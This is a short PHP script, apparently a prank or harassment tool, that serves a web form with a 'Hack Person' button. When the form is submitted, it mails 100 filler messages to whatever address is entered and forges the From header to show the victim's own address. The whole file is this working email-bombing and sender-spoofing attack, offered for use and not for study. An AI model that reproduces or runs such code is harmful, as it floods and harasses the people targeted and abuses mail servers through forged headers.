<?php
//Copy Righted Sandtyco-Ifan
$hackedemail = $_POST['emailhacked'];
if(isset($_POST['hack'])){
$hack = 1;
$user = "Hacker Culun";
while($hack <= 100){
mail($hackedemail,"Anonymous","Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla ut lacus tellus. Praesent consequat viverra tortor malesuada scelerisque.", "From: " ."Salam Echo. - ". $user. "<" . $hackedemail . ">\n");
echo "Hacked";
$hack++;
}
}elseif(!isset($_POST['hack'])){
?>
<form method='post'>
<input type='text' name='emailhacked'><br>
<input type='submit' name='hack' value='Hack Person'>
</form>
<? } 
?>
